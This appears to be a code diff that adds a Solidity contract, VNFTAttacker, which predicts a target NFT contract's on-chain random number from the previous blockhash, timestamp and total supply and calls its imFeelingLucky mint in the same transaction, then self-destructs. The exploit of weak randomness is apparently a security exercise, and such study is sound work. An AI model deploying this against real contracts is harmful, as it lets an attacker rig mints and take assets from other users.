@@ -113,3 +113,30 @@ contract VNFT is ERC721, Ownable {
         return ECDSA.recover(messageDigest, signature);
     }
 }
+
+contract VNFTAttacker {
+    VNFT private immutable target;
+
+    constructor(address _target) {
+        target = VNFT(_target);
+        target.imFeelingLucky(
+            msg.sender,
+            target.MAX_WALLET(),
+            getRandomNumber()
+        );
+        selfdestruct(payable(msg.sender));
+    }
+
+    function getRandomNumber() private view returns (uint256) {
+        return
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp,
+                        target.totalSupply()
+                    )
+                )
+            ) % 100;
+    }
+}
